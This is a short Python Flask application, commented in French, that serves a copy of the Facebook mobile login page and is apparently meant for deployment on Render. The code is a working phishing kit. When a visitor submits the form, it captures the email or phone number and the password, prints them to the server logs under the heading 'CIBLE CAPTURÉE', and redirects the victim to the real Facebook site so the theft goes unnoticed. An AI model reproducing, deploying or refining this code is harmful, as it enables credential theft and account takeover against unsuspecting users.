import os
from flask import Flask, request, redirect

app = Flask(__name__)

# Ton interface Facebook intégrée
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; margin: 0; }
        .header { width: 100%; background-color: #fff; padding: 20px 0; text-align: center; color: #1877f2; font-size: 30px; font-weight: bold; }
        .login-box { width: 90%; max-width: 400px; margin-top: 20px; text-align: center; }
        input { width: 100%; padding: 15px; margin: 5px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">facebook</div>
    <div class="login-box">
        <form action="/login" method="post">
            <input type="text" name="email" placeholder="Mobile number or email" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return HTML_PAGE

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('email')
    password = request.form.get('pass')
    
    # Affiche les identifiants dans les logs de Render
    print(f"\n[!] CIBLE CAPTURÉE")
    print(f"[+] Email/Tel : {user}")
    print(f"[+] Password  : {password}\n")
    
    return redirect("https://m.facebook.com")

if __name__ == '__main__':
    # Indispensable pour que Render puisse ouvrir le port
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
